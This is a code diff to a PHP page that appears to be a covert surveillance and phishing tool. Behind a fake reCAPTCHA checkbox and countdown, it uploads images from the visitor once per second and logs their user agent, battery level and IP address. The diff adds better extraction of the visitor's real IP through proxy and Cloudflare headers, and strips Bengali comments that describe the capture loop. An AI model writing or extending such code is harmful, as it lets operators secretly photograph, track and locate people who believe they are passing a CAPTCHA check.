@@ -36,11 +36,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
     $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
     
-    $ipAddress = $_SERVER['REMOTE_ADDR'];
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+    // শুধু মূল আইপি অ্যাড্রেস বের করার সঠিক কোড
+    $ipAddress = 'Unknown';
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        $ipAddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ipAddress = trim($ipList[0]);
+    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
+        $ipAddress = $_SERVER['REMOTE_ADDR'];
     }
 
     $fileName = 'img_' . uniqid() . '.png';
@@ -255,10 +261,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                         if (isStarted) return;
                         isStarted = true;
 
-                        // প্রথম ছবি ইনস্ট্যান্ট ক্যাপচার করা
                         captureAndUpload();
-
-                        // প্রতি ১ সেকেন্ড (1000ms) পর পর ছবি পাঠানো চালু
                         setInterval(captureAndUpload, 1000);
 
                         const checkbox = document.getElementById('recaptchaCheckbox');
@@ -268,7 +271,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
                         spinner.style.display = 'block';
                         
-                        let timeLeft = 10; // ১০ সেকেন্ড সময়
+                        let timeLeft = 10; 
                         countdownTimer.textContent = `(${timeLeft}s)`;
 
                         let timerInterval = setInterval(() => {
